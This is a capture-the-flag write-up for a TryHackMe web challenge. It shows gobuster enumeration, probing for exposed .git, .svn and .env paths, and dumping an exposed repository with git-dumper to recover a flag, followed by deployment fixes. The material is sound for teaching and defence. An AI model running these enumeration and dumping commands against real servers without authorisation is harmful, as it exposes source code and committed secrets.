# Hacker Holidays: Day 2 - Room 404

**Category:** Web
**Difficulty:** Very Easy

## 🛎️ Concierge Briefing
> The Byte Lotus guest-experience platform went live in a hurry, and the night-shift developer shipped more than the website. Somewhere on port 8080, a whole repository is waiting to be read.

---

## 🕵️‍♂️ Recon

Target: `http://MACHINE_IP:8080`. The briefing says the developer shipped "more than the website", so I wasn't hunting for application bugs — I was hunting for developer leftovers.

A gobuster sweep found the usual surface:

```bash
gobuster dir -u http://MACHINE_IP:8080 -w /usr/share/wordlists/dirb/common.txt
```

But the interesting paths never show up in default wordlists. I checked the classic version-control leftovers by hand:

```text
/.git/
/.svn/
/.hg/
/.env
```

`/.git/` responded — that's the entire game.

## 🔍 Confirming the .git Exposure

A live `.git` directory on a web server means source, history, and internal notes are all downloadable. The `HEAD` file confirms Git metadata is being served:

```bash
curl http://MACHINE_IP:8080/.git/HEAD
```

```text
ref: refs/heads/main
```

Reading raw Git objects by hand is painful (they're zlib-compressed), so I pulled the repository down properly with `git-dumper`:

```bash
pip install git-dumper
git-dumper http://MACHINE_IP:8080/.git/ dumped_repo
```

## 🧨 The Payload

The reconstructed repo contained `app.js`, `index.html`, and a `README.md` carrying internal staging notes:

```bash
cat README.md
```

```text
# Byte Lotus - Guest Experience Platform
Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.
Staging flag (remove before launch): THM{REDACTED}
```

The staging flag was sitting in repository documentation that should never have been shipped to the web root.

## 🚩 The Flag

**Flag:** `THM{REDACTED}`

## 💡 Why This Works

`.git` stores the complete repository — refs, index, and packed or loose objects. Expose that over HTTP and anyone can reconstruct the full source offline, including secrets the developer committed. The vulnerability here was deployment hygiene, not application logic.

## 🛡️ Fixes

- Never deploy `.git`, `.svn`, `.hg`, or `.env` to production
- Block access to hidden files and directories at the web server / reverse proxy level
- Publish only build artifacts, never source directories
- Add CI/CD checks that fail the build when VCS directories are exposed

## 📝 Final Thoughts

Classic information disclosure: enumerate → spot `/.git/` → dump with `git-dumper` → read `README.md`. Fifteen minutes and the internal repository is yours.

**Documented and tested for TryHackMe — Hacker Holidays 2026**
